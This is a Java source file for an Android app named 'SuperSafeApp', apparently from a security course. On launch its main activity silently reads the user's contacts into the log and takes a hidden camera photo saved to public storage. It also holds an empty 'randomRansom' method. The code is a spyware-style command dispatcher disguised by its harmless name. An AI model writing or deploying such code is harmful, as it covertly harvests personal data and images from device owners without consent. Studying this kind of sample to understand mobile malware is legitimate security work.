package com.seginf.supersafeapp;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import android.app.Activity;
import android.content.Context;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Environment;
import android.os.Vibrator;
import android.util.Log;
import android.view.Menu;
import android.view.SurfaceView;

public class MainActivity extends Activity implements Commandable {

	public void vibrate() {
		Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		v.vibrate(500);
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		CommandParser commandParser = new CommandParser(this);
		commandParser.dispatch("VIBRATE").execute();
		commandParser.dispatch("CONTACTS").execute();
		commandParser.dispatch("PHOTO").execute();
	}

	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	private ArrayList<Contact> contacts;

	public void getContactList() {
		this.contacts = new ContactsReader(this.getApplicationContext())
				.contacts();
		Log.d("SAFEAPP", contacts.toString());
	}

	private File getAlbumDir() {
		return new File(
				Environment
						.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
				"/");
	}

	public static Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open(); // attempt to get a Camera instance
		} catch (Exception e) {
			Log.d("SafeApp", "No Camera");
			return null;
		}
		return c; // returns null if camera is unavailable
	}

	private File getImageFile() {
		String s = "yyyyMMdd_HHmmss";
		Date now = new Date();
		String timeStamp = new SimpleDateFormat(s, Locale.US).format(now);

		String imageFileName = "jpeg_" + timeStamp + "_";
		File image;

		try {
			image = File.createTempFile(imageFileName, ".jpeg", getAlbumDir());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
			return null;
		}
		return image;
	}

	public void takePhoto() {
		Camera c = getCameraInstance();
		if(c == null){
			return;
		}
		SurfaceView view = new SurfaceView(this);

		try {
			c.setPreviewDisplay(view.getHolder());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
		}
		c.startPreview();
		
		final File f = getImageFile();
		c.takePicture(null, null, new Camera.PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream out;
				try {
					out = new FileOutputStream(f);
					out.write(data);
					out.close();
				} catch (FileNotFoundException e) {
					Log.e("SafeApp","Exception",e);
				} catch (IOException e) {
					Log.e("SafeApp","Exception",e);
				}
			}
		});
	}

	public void randomRansom() {
		
	}
}
